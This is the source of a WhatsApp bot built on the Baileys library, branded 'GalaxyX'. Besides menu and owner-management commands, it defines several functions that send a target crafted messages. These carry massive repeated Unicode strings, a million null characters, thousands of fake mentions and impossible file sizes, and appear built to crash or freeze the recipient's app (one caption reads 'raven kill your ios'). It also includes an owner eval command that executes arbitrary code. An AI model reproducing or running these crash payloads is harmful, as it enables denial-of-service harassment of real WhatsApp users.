console.clear();
require('./setting/config')

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaSocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const { spawn, exec, execSync } = require('child_process')
//END
//MODULE MESSAGE + PREFIX

module.exports = Ril = async (Ril, m, chatUpdate, store) => {
    try {
        var body = (
            m.mtype === "conversation" ? m.message.conversation || "[Conversation]" :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" :
            m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" :
            m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" :
            m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" :
            m.mtype === "contactMessage" ? "[Contact]" :
            m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" :
            m.mtype === "liveLocationMessage" ? "[Live Location]" :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]" :
            m.mtype === "pollCreationMessage" ? "[Poll Creation]" :
            m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" :
            m.mtype === "ephemeralMessage" ? "[Ephemeral]" :
            m.mtype === "viewOnceMessage" ? "[View Once]" :
            m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" :
            "[Unknown Type]"
        );
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./System/x1')

//END

const Owner = JSON.parse(fs.readFileSync('./Access/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./Access/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await Ril.decodeJid(Ril.user.id)
const CreatorOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = m.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await Ril.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''

const Rilyzy = fs.readFileSync(`./System/Thumb.jpg`)

if (!Ril.public) {
if (!CreatorOnly) return
}
//- P -\\
if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`# New Message`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//FUNCTION
async function exoticsChronos(Ril, jid, etc = true) {
      await Ril.relayMessage(jid, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "nachels.zip",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "GalaxyX-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
                  length: 2000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "Nachels.doc",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, etc ? {
        participant: { jid: jid }
    } : {});
 }

async function exoticsStunt(Ril, jid) {
  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "@rvnnsix - fuck u",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            params: `${"\u0000".repeat(1000000)}`,
            version: 3
          }
        }
      }
    }
  }, {});
  
  const parse = true;
  const SID = "5e03e0";
  const key = "10000000_2203140470115547_947412155165083119_n.enc";
  const Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  const type = `application/was`;
  const metaAiJid = "13135550002@s.whatsapp.net";
  if (11 > 9) {
    parse = parse ? false : true;
  }
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 9999,
            unsigned: true
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: metaAiJid,
            remoteJid: metaAiJid,
            conversionSource: "meta_ai_search",
            entryPointConversionSource: "meta_ai",
            entryPointConversionApp: "whatsapp",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  };
  
  const messages = await generateWAMessageFromContent(jid, message, {});
  await Ril.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [{
      tag: "meta", attrs: {}, content: [{
        tag: "mentioned_users", attrs: {}, content: [{
          tag: "to", attrs: { jid: jid }, content: undefined
        }]
      }]
    }]
  });
  
  await Ril.relayMessage("status@broadcast", messages.message, {
    messageId: messages.key.id,
    statusJidList: [jid],
    additionalNodes: [{
        tag: "meta",
        attrs: { author: "meta_ai", type: "bot_response" },
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: { jid: jid },
                content: undefined
              }]
          }]
      }, {
        tag: "bot",
        attrs: { biz_bot: "1", service_type: "meta_ai" }
      }]
  });
}

async function exoticsIPV2(Ril, jid) {
  try {
    const msg = generateWAMessageFromContent(jid, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -66.666,
            degreesLongtitude: 66.666,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            jpegThumbnail: null,
            url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
            contextInfo: {
              participant: jid,
              forwardingScore: 1,
              isForwarded: true,
              stanzaId: jid,
              mentionedJid: [jid]
            },
          },
        },
      },
    }, {});
    
   await Ril.relayMessage(jid, {
     requestPhoneNumberMessage: {
      contextInfo: {
       quotedMessage: {
        documentMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
         mimetype: "application/pdf",
         fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
         fileLength: 0,
         pageCount: 0,
         mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
         fileName: "ven.pdf",
         fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
         directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1737369406,
          caption: "raven kill your ios",
          title: "@rvnn6",
          mentionedJid: [jid],
          }
        },
        externalAdReply: {
         title: "apasi ven?",
         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         sourceUrl: "https://t.me/rvnn6",
         mediaUrl: "https://t.me/rvnn6",
         containsAutoReply: true,
         renderLargerThumbnail: true,
         showAdAttribution: true,
         ctwaClid: "ctwa_clid_example",
         ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          contentType: "UPDATE",
        },
      },
     skipType: 7,
    }
  }, {
   participant: { jid: jid }
 });
 
  await Ril.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: jid }, content: undefined
          }],
        }],
      }],
    });
  } catch (error) {
    console.log(error);
  }
}

async function exoticsVideoX(Ril, jid) {
  const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "GalaxyX - Nachels" + 
                    "ꦾ".repeat(10000) +
                    "ꦽ".repeat(10000) +
                    "\n" +
                    "@13135550002".repeat(50000),
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 1999 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "x",
                                    songId: "?",
                                    author: ".rvnnsix",
                                    title: "exot1cs",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});
    
   await Ril.relayMessage(jid, msg.message, {
     participant: { jid: jid },
     messageId: msg.key.id
   });
}

async function exoticsUiX(Ril, jid) {
  await Ril.relayMessage(jid, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "GalaxyX.zip",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "apa? galaxyx?" + "ꦾ".repeat(5000) + "\n" + "@5".repeat(90000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Anarchy6" }]
                    }
                }
            }
        }
    }, { participant: { jid: jid } }, { messageId: null });
}

async function exoticsOrderx(Ril, jid) {
  let empty = null;
  let injectNumber = 999999999;
  const emptyString = "";
  const tripleNine = 999;
  const template = {
    orderId: emptyString,
    thumbnail: empty,
    itemCount: 0,
    surface: tripleNine,
    status: tripleNine,
    message: emptyString,
    sellerJid: jid,
    orderTitle: emptyString,
    amount: {
      value: injectNumber,
      offset: 100,
      currencyCode: "IDR"
    },
    token: emptyString
  };

  const contextDetail = {
    externalAdReply: {
      title: emptyString,
      body: emptyString,
      msdiaType: 1,
      thumbnail: empty,
      mediaUrl: emptyString
    }
  };
  
  await Ril.relayMessage(jid, { orderMessage: template, contextInfo: contextDetail }, { messageId: empty, participant: { jid: jid }, quoted: empty, userJid: jid 
  });
}

async function exoticsReqPay(Ril, jid) {
  await Ril.relayMessage(jid, {
    requestPaymentMessage: {}
  }, {
    messageId: null,
    participant: { jid: jid }
  });
  await Ril.relayMessage(jid, {
    sendPaymentMessage: {}
  }, {
    messageId: null,
    participant: { jid: jid }
  });
}

// end
const zets = {
  key: {
	fromMe: false,
	  participant: "0@s.whatsapp.net",
		remoteJid: "status@broadcast"
	  },
		message: {
		  orderMessage: {
		  orderId: "2029",
		  thumbnail: Rilyzy, 
		    itemCount: `9999999`,
		    status: "INQUIRY",
		    surface: "CATALOG",
		    message: `#LegacyX7`,
		    token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
		  }
	    },
	    contextInfo: {
		  mentionedJid: [m.sender],
		  forwardingScore: 999,
		  isForwarded: true
		}
	  }

const ReplyRil = (teks) => {
  return Ril.sendMessage(
    m.chat,
    {
      text: teks,
      contextInfo: {
        mentionedJid: [m.chat],
        forwardingScore: 99999999,
        isForwarded: true,
        externalAdReply: {
          title: "#GalaxyX",
          body: "© Nachels",
          mediaType: 1,
          renderLargerThumbnail: false,
          showAdAttribution: false,
          thumbnailUrl: "https://files.catbox.moe/y2d2oe.jpg",
          sourceUrl: ""
        }
      }
    },
    { quoted: zets }
  );
};

//END

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'menu': {
await Ril.sendMessage(m.chat, {
  text: `*─── GalaxyX Menu ───*

👋 Halo ${m.pushName || 'User'}!

📌 *Info Bot:*
• Creator: NachelsX
• Version: 1.5 Free
• Runtime: ${runtime(process.uptime())}

📋 *Commands:*
• !menu - Menu ini
• !ping - Cek bot

🔧 *Owner:*
• .public - Mode public
• .self - Mode self

_ Powered by GalaxyX_
`
});
}
break;
//=======================\\
//===========case OwnMenu/Fun============\\
case 'addowner': case 'addown':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan : ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await Ril.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return ReplyRil(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero} succes add to database!`);
  break;
//=======================\\
case 'delowner': case 'delown':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan: ${prefix + command} Example:\n ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero2} succes delate to database!`);
  break;
//=======================\\
case 'addpremium': case 'addprem':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan: ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await Ril.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return ReplyRil(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero} succes add to database!`);
  break;
//=======================\\
case 'delpremium': case 'delprem':
if (!CreatorOnly) return ReplyRil("*Your Not Owner*")
  if (!args[0]) return ReplyRil(`Penggunaan ${prefix + command} Example ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRil(`Number ${numero2} succes delate to database!`);
  break;
//=======================\\
case 'public': {
  if (!CreatorOnly) return ReplyRil("*You're Not My Owner*");

  Ril.public = true;
  ReplyRil(`*Success: Changed Mode from Self to Public*`);
}
break;
//=======================\\
case 'self': case 'private': {
  if (!CreatorOnly) return ReplyRil("*You're Not My Owner*");

  Ril.public = false;
  ReplyRil(`*Success: Changed Mode from Public to Self*`);
}
break;

case "eval": {
                if (!budy.startsWith(".eval")) return;
                
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return ReplyRil(`*ex:* ${prefix + command} m.chat`);
                let teks;
                try {
                    teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
                } catch (e) {
                    teks = e;
                } finally {
                    await ReplyRil(require('util').format(teks));
                }
            }
            break;

case "info": {
  const messType = m.quoted ? { [m.quoted.mtype]:m.quoted } : { [m.mtype]:m.message };
  const formattedJson = JSON.stringify(messType, null, 2);
  Ril.relayMessage(m.chat, {
    "extendedTextMessage": {
      "text": formattedJson 
    }
  }, {});
}
break;

case "swgrup": case "swgc": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await Ril.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
